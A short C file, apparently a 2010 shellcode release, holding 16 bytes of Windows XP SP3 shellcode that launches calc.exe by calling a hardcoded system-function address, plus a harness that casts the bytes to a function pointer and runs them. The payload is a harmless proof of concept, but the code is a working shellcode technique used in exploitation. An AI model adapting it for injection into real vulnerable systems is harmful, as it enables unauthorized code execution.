/*------------------------------------------------------------------------
  Title...................Windows XP SP3 EN Calc Shellcode 16 Bytes
  Release Date............12/7/2010
  Tested On...............Windows XP SP3 EN
  ------------------------------------------------------------------------
  Author..................John Leitch
  Site....................http://www.johnleitch.net/
  Email...................john.leitch5@gmail.com
  ------------------------------------------------------------------------*/

int main(int argc, char *argv[])
{
    char shellcode[] =
        "\x31\xC9"                // xor ecx,ecx
        "\x51"                    // push ecx
        "\x68\x63\x61\x6C\x63"    // push 0x636c6163
        "\x54"                    // push dword ptr esp
        "\xB8\xC7\x93\xC2\x77"    // mov eax,0x77c293c7
        "\xFF\xD0";               // call eax

    ((void(*)())shellcode)();

    return 0;
}